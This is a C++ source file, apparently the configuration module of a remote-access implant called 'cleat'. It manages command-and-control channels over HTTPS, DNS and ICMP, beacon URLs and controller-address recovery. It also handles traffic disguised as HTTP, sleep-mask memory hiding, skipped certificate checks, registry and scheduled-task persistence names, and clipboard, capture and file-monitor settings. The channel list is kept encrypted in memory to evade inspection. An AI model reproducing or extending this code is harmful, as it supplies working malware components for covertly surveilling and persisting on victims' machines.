/**
 * @file AgentConfig.cpp
 * @brief AgentConfig 类实现：单例与线程安全的配置读取
 * @details
 * 只保留类生命周期与查询职责：
 * - Instance：静态单例实例获取
 * - GetXxx 系列：读锁拷贝，保证线程安全
 * 配置 <-> JSON 序列化层（ToJson/ApplyXxx + ApplyJson/DumpJson）已拆至
 * AgentConfigJson.cpp；JSON 字段读取工具见 JsonField.hpp。
 */

#include "AgentConfig.hpp"

#include <cctype>
#include <sodium.h>
#include <shared_mutex>
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Core/Security/SecretVault.hpp"

namespace cleat {

    namespace {
        // Phase C: 通道链 <-> JSON 序列化(与 AgentConfigJson 下发/回显格式锁步)
        nlohmann::json ChannelsToJson(const std::vector<ChannelSpec>& chans) {
            nlohmann::json arr = nlohmann::json::array();
            for (const auto& s : chans) {
                nlohmann::json item = { {"type", s.type} };
                if (!s.host.empty())        item["host"] = s.host;
                if (s.port != 0)            item["port"] = s.port;
                if (!s.url.empty())         item["url"] = s.url;
                if (!s.upload_url.empty())  item["upload_url"] = s.upload_url;
                if (!s.dns_server.empty())  item["dns_server"] = s.dns_server;
                if (!s.dns_domain.empty())  item["dns_domain"] = s.dns_domain;
                if (!s.icmp_target.empty()) item["icmp_target"] = s.icmp_target;
                arr.push_back(std::move(item));
            }
            return arr;
        }

        bool ChannelsFromJson(const nlohmann::json& arr, std::vector<ChannelSpec>& out) {
            out.clear();
            for (const auto& item : arr) {
                if (!item.is_object()) return false;
                ChannelSpec s;
                if (item.contains("type") && item["type"].is_string()) {
                    s.type = item["type"].get<std::string>();
                    for (auto& c : s.type) c = static_cast<char>(::tolower(static_cast<unsigned char>(c)));
                }
                if (item.contains("host") && item["host"].is_string()) s.host = item["host"].get<std::string>();
                if (item.contains("port") && item["port"].is_number_integer()) {
                    s.port = static_cast<uint16_t>(item["port"].get<int64_t>());
                }
                if (item.contains("url") && item["url"].is_string()) s.url = item["url"].get<std::string>();
                if (item.contains("upload_url") && item["upload_url"].is_string()) s.upload_url = item["upload_url"].get<std::string>();
                if (item.contains("dns_server") && item["dns_server"].is_string()) s.dns_server = item["dns_server"].get<std::string>();
                if (item.contains("dns_domain") && item["dns_domain"].is_string()) s.dns_domain = item["dns_domain"].get<std::string>();
                if (item.contains("icmp_target") && item["icmp_target"].is_string()) s.icmp_target = item["icmp_target"].get<std::string>();
                if (!s.Valid()) return false;
                out.push_back(std::move(s));
            }
            return true;
        }

        void WipeChannelSpec(ChannelSpec& s) {
            const auto z = [](std::string& v) {
                if (!v.empty()) {
                    sodium_memzero(v.data(), v.size());
                    v.clear();
                    v.shrink_to_fit();
                }
            };
            z(s.type);
            z(s.host);
            z(s.url);
            z(s.upload_url);
            z(s.dns_server);
            z(s.dns_domain);
            z(s.icmp_target);
        }
    } // namespace

    // ---- AgentConfig 成员函数实现 ----
    // 单例入口 / 构造 / 纯读值 getter(GetServiceDefaults/GetCapture/GetClipboard/
    // GetFileMonitor/GetChannelLimit)已作为 inline 定义在 AgentConfig.hpp ——
    // 模块 DLL 要读配置默认值但不背本文件的 SecretVault + libsodium 依赖, 见头文件注释。

    /**
     * @brief 获取首连随机延时上限（防惊群）
     * @return uint32_t 延时上限（毫秒），0 表示不延时
     */
    uint32_t AgentConfig::GetFirstConnectDelayMaxMs() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return first_connect_delay_max_ms_;
    }

    /**
     * @brief 获取命令执行超时时间
     * @return uint32_t 超时毫秒数，0 表示不限时
     */
    uint32_t AgentConfig::GetWorkerTimeoutMs() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return worker_timeout_ms_;
    }

    /**
     * @brief 获取日志级别
     * @return int 0=DEBUG 1=INFO 2=WARN 3=ERROR 4=OFF
     */
    int AgentConfig::GetLogLevel() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return log_level_;
    }

    /**
     * @brief 获取 HTTP User-Agent
     * @return std::string 当前使用的 UA 字符串，空字符串表示使用随机池
     * @note 此字段启动期固定，但运行期经 SetConfig 写锁更新，因此需要加读锁
     */
    std::string AgentConfig::GetHttpUserAgent() const {
        // 注：http_user_agent 在启动期固定（编译期默认/CLI），运行期可通过 ApplyJson 更新，
        // 这里使用读锁保护以防并发写。
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return http_user_agent;
    }

    /**
     * @brief 获取 HTTPS 证书校验跳过开关
     * @return true = 跳过校验(自签场景)
     * @note AF1/F2: 该字段可远程下发(ApplyJson 持写锁写), 故读必须加锁
     */
    bool AgentConfig::GetHttpsIgnoreCert() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return https_ignore_cert;
    }

    /**
     * @brief 获取 HTTPS 代理
     * @return 空=直连 | "system"=系统代理 | "host:port"=显式代理(返回拷贝, 锁外使用安全)
     * @note AF1/F2: 同 GetHttpsIgnoreCert
     */
    std::string AgentConfig::GetHttpsProxy() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return https_proxy;
    }

    /**
     * @brief 设置 HTTPS 证书校验跳过开关(CLI --https-ignore-cert / 测试脚手架)
     * @note 加写锁; **不得**在已持锁路径调用(shared_mutex 非递归)。运行期下发走 ApplyJson。
     */
    void AgentConfig::SetHttpsIgnoreCert(bool v) {
        std::unique_lock<std::shared_mutex> lock(mutex_);
        https_ignore_cert = v;
    }

    /// 设置 HTTPS 代理(CLI --https-proxy / 测试脚手架); 其余同 SetHttpsIgnoreCert
    void AgentConfig::SetHttpsProxy(const std::string& v) {
        std::unique_lock<std::shared_mutex> lock(mutex_);
        https_proxy = v;
    }

    /**
     * @brief 获取 QUIC 通道证书校验跳过开关
     * @return true = 跳过校验(自签场景)
     * @note 与 GetHttpsIgnoreCert 同款: 字段可远程下发(ApplyJson 持写锁写), 读必须加锁
     */
    bool AgentConfig::GetQuicIgnoreCert() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return quic_ignore_cert;
    }

    /**
     * @brief 设置 QUIC 通道证书校验跳过开关(CLI --quic-ignore-cert)
     * @note 加写锁; **不得**在已持锁路径调用(shared_mutex 非递归)。运行期下发走 ApplyJson。
     */
    void AgentConfig::SetQuicIgnoreCert(bool v) {
        std::unique_lock<std::shared_mutex> lock(mutex_);
        quic_ignore_cert = v;
    }

    /**
     * @brief 获取睡眠掩码配置(SetConfig mask 域;  MaskWindow 设计)
     * @note 与 GetQuicIgnoreCert 同款: 可远程下发(ApplyJson 持写锁写), 读加锁。
     *       执行体需构建期 CLEAT_WITH_MASK=ON; 未编入时配置无害(判定层拒绝)。
     */
    MaskConfig AgentConfig::GetMaskConfig() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return mask_;
    }

    void AgentConfig::SetMaskConfig(const MaskConfig& v) {
        std::unique_lock<std::shared_mutex> lock(mutex_);
        mask_ = v;
    }

    /**
     * @brief 获取 TCP 伪装壳开关
     * @return true = 出站帧包 HTTP 伪装壳 + 接收侧剥头(TrafficShaper)
     * @note 与 GetHttpsIgnoreCert 同款: 可远程下发(ApplyJson 持写锁写), 读加锁。
     *       原 CLEAT_HTTP_MIMIC 编译期宏的运行时化。
     */
    bool AgentConfig::GetTcpMimic() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return tcp_mimic;
    }

    /**
     * @brief 获取持久化注册表值名称
     * @return std::string 值名，空字符串表示随机生成
     */
    std::string AgentConfig::GetPersistValueName() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return persist_value_name_;
    }

    /**
     * @brief 获取持久化任务名称
     */
    std::string AgentConfig::GetPersistTaskName() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return persist_task_name_;
    }

    /**
     * @brief 获取持久化作者信息
     */
    std::string AgentConfig::GetPersistAuthor() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return persist_author_;
    }

    // : GetCrashDumpEnabled 已移除 —— 崩溃日志改由构建期决定,
    // 见 Core/CrashGuard/CrashGuard.hpp 契约注释。

    /**
     * @brief 获取心跳配置副本
     * @return HeartbeatConfig 拷贝
     */
    HeartbeatConfig AgentConfig::GetHeartbeat() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return heartbeat_;
    }

    /**
     * @brief 获取重连退避配置副本
     */
    ReconnectConfig AgentConfig::GetReconnect() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return reconnect_;
    }

    /**
     * @brief 校验通道规格有效性（按 type 检查必填字段）
     * @return true 该通道规格可被降级链接受
     * @details P2 彻底合流: 判据转调 ChannelFieldRules.hpp 的单一真相, 不再是本处的
     *          per-type if 链(与注册表描述符 valid 曾各写一份, 靠人眼维持一致)。
     */
    bool ChannelSpec::Valid() const {
        ChannelFields f;
        f.host = host;
        f.url = url;
        f.dns_server = dns_server;
        f.dns_domain = dns_domain;
        f.icmp_target = icmp_target;
        return ChannelFieldsSatisfied(type, f);
    }

    /**
     * @brief 获取传输降级链策略副本
     */
    TransportFailoverConfig AgentConfig::GetTransportFailover() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return transport_failover_;
    }

    /**
     * @brief 获取通道降级链副本
     */
    AgentConfig::RecoveryConfig AgentConfig::GetRecovery() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return recovery_;
    }

    /// N44: 把 url 的 scheme://host:port 段替换为 newOrigin, **保留原路径/查询**。
    /// (suffix 语义 = "新基地址"; GET/POST 的路径沿用 Agent 原配置 —— 否则 POST 会
    std::string ReplaceOrigin(const std::string& url, const std::string& newOrigin) {
        const std::string sep = "://";
        const size_t schemeEnd = url.find(sep);
        if (schemeEnd == std::string::npos) return newOrigin;
        const size_t pathStart = url.find('/', schemeEnd + sep.size());
        if (pathStart == std::string::npos) return newOrigin;   // 原无路径 → 用基地址
        return newOrigin + url.substr(pathStart);
    }

    bool AgentConfig::ApplyRecoveredUrl(const std::string& newUrl) {
        std::unique_lock<std::shared_mutex> lock(mutex_);
        // newOrigin 规范化: 允许 suffix 带路径(截到 host:port) —— 路径以 Agent 原配置为准
        std::string origin = newUrl;
        {
            // **路径斜杠必须从 scheme 之后找**:
            // 裸 find('/') 命中 "http:/" 的第一个斜杠, q > schemeEnd+2 恒假 ——
            // origin 永不截断, 与 ReplaceOrigin 的保留路径拼接后变成
            // "/beacon/poll/beacon/poll" 双重路径(beacon 404, 复活失败)。
            const size_t schemeEnd = origin.find("://");
            const size_t q = (schemeEnd == std::string::npos)
                ? std::string::npos : origin.find('/', schemeEnd + 3);
            if (schemeEnd != std::string::npos && q != std::string::npos) {
                origin = origin.substr(0, q);   // 截掉路径与查询
            }
        }
        auto chans = OpenChannelsLocked();
        if (chans.empty()) {
            // **CLI 启动形态首次物化**: CLI --transport 的
            // 通道直接构建进 Chain, 不经 AgentConfig.channels —— 恢复换址时"无处可换"。
            // 此时以恢复地址**物化单条 https 候选**(bump 后 ReloadChannels 重建链,
            // 后续 SetConfig channels 热切换语义恢复常态)。
            ChannelSpec c;
            c.type = "https";
            c.url = newUrl;
            c.upload_url = newUrl;
            chans.push_back(c);
            LOG_WARN("AgentConfig: channels 为空(CLI 形态), 以恢复地址物化单条 https 候选");
        }
        bool changed = false;
        for (auto& c : chans) {
            if (c.type != "https") continue;
            // GET 路径: suffix 自带路径(含 '/') → 用 suffix 的; 否则沿用原 url 的路径;
            // 都没有 → "/api/check" 惯例默认。origin 只替换 scheme://host:port。
            std::string getPath;
            {
                // 同上: 路径斜杠从 scheme 之后找(裸 find('/') 命中 "http:/" 的
                // 第一个斜杠, suffix 带路径时判定恒假 → 与 ReplaceOrigin 拼出双路径)。
                const size_t schemeEnd = newUrl.find("://");
                const size_t q = (schemeEnd == std::string::npos)
                    ? std::string::npos : newUrl.find('/', schemeEnd + 3);
                if (q != std::string::npos && schemeEnd != std::string::npos) {
                    getPath = newUrl.substr(q);                    // suffix 自带路径
                }
                else if (!c.url.empty()) {
                    getPath = ReplaceOrigin(c.url, origin).substr(origin.size());
                }
                else {
                    getPath = "/api/check";                        // 惯例默认
                }
                if (getPath.empty() || getPath[0] != '/') {
                    getPath = "/api/check";   // 兜底: 原 url 无路径(suffix 仅基地址)时用惯例默认
                }
            }
            c.url = origin + getPath;
            c.upload_url = origin + (recovery_.upload_path.empty()
                ? "/api/data" : recovery_.upload_path);
            changed = true;
            // 只换**第一条** https: 原实现遍历改写所有 https ——
            // 多 https 降级链的备用链路被一并改到恢复地址, "备份地址仍是死地址"的
            // 多样性丢失; 向头文件"第一个 https 通道"的既有承诺对齐。
            break;
        }
        if (!changed) {
            LOG_WARN("AgentConfig: 恢复换址未应用 —— 无 https 通道(纯 TCP 部署)");
            return false;
        }
        // 换址静默失效 + 既有配置被清, 上游还打出"恢复完成"假成功。
        if (!SealChannelsLocked(chans)) {
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::CryptoOpFailed, "AgentConfig: 恢复换址密封失败, 放弃本次换址(配置保持原状)");
            return false;
        }
        ++channels_revision_;
        LOG_INFO("AgentConfig: 恢复换址已应用, 修订号 -> " << channels_revision_);
        return true;
    }

    std::vector<ChannelSpec> AgentConfig::GetChannels() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return OpenChannelsLocked();
    }

    // ---- Phase C: 通道链密文驻留 ----

    bool AgentConfig::SealChannelsLocked(std::vector<ChannelSpec>& chans) {
        if (!SecretVault::Instance().Init()) {
            // fail-closed: 保不住密文就丢弃本次更新(通道链继续走上一条/空),
            // 不接受"明文驻留但功能正常"的静默降级
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::CryptoOpFailed, "AgentConfig: SecretVault 初始化失败, 通道链更新被丢弃(fail-closed)");
            channels_sealed_.clear();
            return false;
        }
        const nlohmann::json arr = ChannelsToJson(chans);
        std::string js = arr.dump();
        std::vector<uint8_t> plain(js.begin(), js.end());
        std::vector<uint8_t> sealed = SecretVault::Instance().Seal(plain.data(), plain.size());
        sodium_memzero(plain.data(), plain.size());
        SecretVault::Wipe(plain);
        sodium_memzero(js.data(), js.size());
        js.clear();

        bool ok = false;
        if (sealed.empty()) {
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::CryptoOpFailed, "AgentConfig: 通道链密封失败, 更新被丢弃(fail-closed)");
            channels_sealed_.clear();
        }
        else {
            channels_sealed_ = std::move(sealed);
            ok = true;
        }
        // 明文副本用后即擦(调用方 ApplyJson 持有此拷贝且不再使用)
        for (auto& s : chans) {
            WipeChannelSpec(s);
        }
        chans.clear();
        // 不得 bump revision, 否则换址静默失效 + 配置销毁的"假成功"。
        return ok;
    }

    std::vector<ChannelSpec> AgentConfig::OpenChannelsLocked() const {
        std::vector<ChannelSpec> out;
        if (channels_sealed_.empty()) {
            return out;   // 未下发 = 空, 语义与改动前一致(使用启动装配 legacy 链)
        }
        std::vector<uint8_t> plain;
        if (!SecretVault::Instance().Open(channels_sealed_, plain) || plain.empty()) {
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::IntegrityMismatch, "AgentConfig: 通道链解封失败(损坏/被篡改?), 回退空链");
            return out;
        }
        nlohmann::json arr = nlohmann::json::parse(plain.data(), plain.data() + plain.size(), nullptr, false);
        SecretVault::Wipe(plain);
        if (!arr.is_array() || !ChannelsFromJson(arr, out)) {
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::IntegrityMismatch, "AgentConfig: 通道链解封后解析失败, 回退空链");
            out.clear();
        }
        return out;
    }

    /**
     * @brief 获取通道链版本号（热切换后递增，供 watcher 检测）
     */
    uint64_t AgentConfig::GetChannelsRevision() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return channels_revision_;
    }

    void AgentConfig::SetChannelCapabilities(const nlohmann::json& caps) {
        std::unique_lock<std::shared_mutex> lock(mutex_);
        channel_caps_ = caps;
    }

    nlohmann::json AgentConfig::GetChannelCapabilities() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return channel_caps_;
    }

    // GetServiceDefaults / GetCapture / GetClipboard / GetFileMonitor / GetChannelLimit
    // 已作为 inline 定义在 AgentConfig.hpp(供模块 DLL 复用, 见该文件注释)。

} // namespace cleat
